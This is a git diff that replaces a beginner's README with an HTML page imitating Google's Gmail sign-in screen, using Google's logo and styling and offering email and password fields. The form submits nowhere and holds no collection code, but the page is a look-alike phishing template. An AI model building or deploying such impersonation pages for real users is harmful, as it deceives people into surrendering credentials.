@@ -1,3 +1,127 @@
-# My-first-project
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Sign in - Google</title>
+  <style>
+    body {
+      font-family: 'Roboto', Arial, sans-serif;
+      background: #f2f2f2;
+      margin: 0;
+      padding: 0;
+    }
 
-Bu Githubdagi birinchi loyiham!
+    .login-container {
+      max-width: 400px;
+      margin: 80px auto;
+      background: #fff;
+      padding: 40px 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    }
+
+    .google-logo {
+      display: block;
+      margin: 0 auto 20px;
+      width: 75px;
+    }
+
+    h1 {
+      font-size: 24px;
+      margin-bottom: 10px;
+      text-align: center;
+      color: #202124;
+    }
+
+    p.subtitle {
+      font-size: 16px;
+      color: #5f6368;
+      text-align: center;
+      margin-bottom: 25px;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+
+    .login-footer {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 30px;
+    }
+
+    .forgot {
+      color: #1a73e8;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .forgot:hover {
+      text-decoration: underline;
+    }
+
+    button {
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      padding: 10px 24px;
+      font-size: 14px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #1669c1;
+    }
+
+    .create-account {
+      margin-top: 40px;
+      text-align: center;
+    }
+
+    .create-account a {
+      color: #1a73e8;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .create-account a:hover {
+      text-decoration: underline;
+    }
+
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="google-logo">
+
+    <h1>Sign in</h1>
+    <p class="subtitle">to continue to Gmail</p>
+
+    <form>
+      <input type="email" placeholder="Email or phone" required>
+      <input type="password" placeholder="Enter your password" required>
+
+      <div class="login-footer">
+        <a href="#" class="forgot">Forgot email?</a>
+        <button type="submit">Next</button>
+      </div>
+    </form>
+
+    <div class="create-account">
+      <a href="#">Create account</a>
+    </div>
+  </div>
+
+</body>
+</html>
